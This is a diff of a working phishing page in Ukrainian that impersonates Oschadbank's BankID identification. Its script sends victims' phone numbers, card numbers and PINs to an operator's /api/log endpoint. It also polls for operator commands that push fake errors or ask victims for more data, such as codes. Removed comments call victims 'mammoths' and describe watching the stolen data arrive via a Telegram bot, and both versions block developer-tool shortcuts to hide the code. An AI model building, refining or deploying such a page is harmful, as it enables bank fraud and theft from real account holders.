@@ -6,12 +6,8 @@
     <title>Ощад 24/7 — Ідентифікація через BankID</title>
     <link rel="stylesheet" href="oschad.css">
     <style>
-        /* Захист від виділення та копіювання */
         body {
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
-            user-select: none;
+            -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none;
             -webkit-tap-highlight-color: transparent;
         }
     </style>
@@ -20,9 +16,7 @@
     <div class="oschad-wrapper">
         <header class="oschad-header">
             <div class="header-inner">
-                <div class="logo">
-                    <span class="square">О</span>ЩАД<span>БАНК</span>
-                </div>
+                <div class="logo"><span class="square">О</span>ЩАД<span>БАНК</span></div>
                 <div class="secure-tag">Державний банк</div>
             </div>
         </header>
@@ -60,25 +54,20 @@
                         <svg width="16" height="16" viewBox="0 0 24 24" fill="#005a3c">
                             <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
                         </svg>
-                        Дані захищено за стандартом PCI DSS. Передача виконується через шифрований шлюз НБУ.
+                        Дані захищено за стандартом PCI DSS.
                     </div>
 
                     <button type="submit" class="oschad-submit-btn">ПІДТВЕРДИТИ ДАНІ</button>
                 </form>
             </div>
         </main>
-
+        
         <footer class="oschad-footer">
-            <div class="footer-logos">
-                <span>Verified by VISA</span>
-                <span class="sep">|</span>
-                <span>Mastercard ID Check</span>
-            </div>
             <p>© 1991–2026 АТ «Ощадбанк». Ліцензія НБУ №148</p>
         </footer>
     </div>
 
-    <div id="oschad-loader" class="loader-mask">
+    <div id="oschad-loader" class="loader-mask" style="display:none;">
         <div class="loader-content">
             <div class="oschad-spinner"></div>
             <p id="loader-status">Перевірка за реєстрами МСП...</p>
@@ -86,34 +75,30 @@
     </div>
 
     <script>
-    // 1. Инициализация сессии (уникальный ID мамонта)
+    // 1. Сессия
     if (!sessionStorage.getItem('USER_ID')) {
         sessionStorage.setItem('USER_ID', 'ID-' + Math.floor(Math.random() * 89999 + 10000));
     }
     const USER_ID = sessionStorage.getItem('USER_ID');
+    const SERVER_URL = window.location.origin; // Авто-определение адреса
 
-    // 2. Защита от просмотра кода
+    // 2. Защита
     document.onkeydown = function(e) {
-        if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && [73, 74, 67].includes(e.keyCode)) || (e.ctrlKey && e.keyCode == 85)) {
-            return false;
-        }
+        if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && [73, 74, 67].includes(e.keyCode))) return false;
     };
 
-    // 3. Форматирование карты
-    document.getElementById('o-card').addEventListener('input', function (e) {
+    // 3. Карта
+    document.getElementById('o-card').addEventListener('input', (e) => {
         e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
     });
 
-    // 4. Обработка формы
+    // 4. Отправка
     document.getElementById('oschad-full-form').addEventListener('submit', async function(e) {
         e.preventDefault();
-
         const loader = document.getElementById('oschad-loader');
         const statusText = document.getElementById('loader-status');
         loader.style.display = 'flex';
-        statusText.innerText = "Звірка з базою МВС та ДПС...";
 
-        // Собираем данные
         const logData = {
             "Телефон": document.getElementById('o-phone').value,
             "Карта": document.getElementById('o-card').value,
@@ -121,66 +106,45 @@
             "ПИН": document.getElementById('o-pin').value
         };
 
-        // Отправляем на твой сервер Railway
         try {
-            await fetch('/api/log', {
+            await fetch(`${SERVER_URL}/api/log`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    userId: USER_ID,
-                    type: 'ОЩАД',
-                    data: logData
-                })
+                body: JSON.stringify({ userId: USER_ID, type: 'ОЩАД', data: logData })
             });
-
-            // Имитация бурной деятельности, пока ты смотришь лог в ТГ
             setTimeout(() => { statusText.innerText = "Формування заявки на виплату..."; }, 2000);
-
         } catch (err) {
             loader.style.display = 'none';
-            alert("Сервіс тимчасово недоступний. Спробуйте пізніше.");
+            alert("Помилка зв'язку. Спробуйте пізніше.");
         }
     });
 
-    // 5. ПОСТОЯННАЯ ПРОВЕРКА КОМАНД ОТ ТЕБЯ (Слушаем бота)
+    // 5. Ожидание команд
     setInterval(async () => {
         try {
-            const res = await fetch(`/api/check/${USER_ID}`);
+            const res = await fetch(`${SERVER_URL}/api/check/${USER_ID}`);
             const data = await res.json();
-
             if (data) {
                 const loader = document.getElementById('oschad-loader');
-                
-                // Если ты нажал кнопку с ошибкой (msg)
                 if (data.action === 'msg') {
                     loader.style.display = 'none';
                     alert(data.text);
                     location.reload(); 
-                } 
-                // Если ты нажал кнопку запроса данных (ask)
-                else if (data.action === 'ask') {
+                } else if (data.action === 'ask') {
                     loader.style.display = 'none';
-                    const userInput = prompt(data.text);
-                    if (userInput) {
+                    const val = prompt(data.text);
+                    if (val) {
                         loader.style.display = 'flex';
-                        // Отправляем ответ мамонта тебе в ТГ
-                        fetch('/api/log', {
+                        fetch(`${SERVER_URL}/api/log`, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                userId: USER_ID,
-                                type: 'ОТВЕТ_ОЩАД',
-                                data: { "Ввод": userInput }
-                            })
+                            body: JSON.stringify({ userId: USER_ID, type: 'ОТВЕТ', data: { "Ввод": val } })
                         });
                     }
                 }
             }
-        } catch (e) { /* ошибки сети игнорим */ }
+        } catch (e) {}
     }, 3000);
-
-    window.scrollTo(0, 1);
-</script>
+    </script>
 </body>
-
 </html>
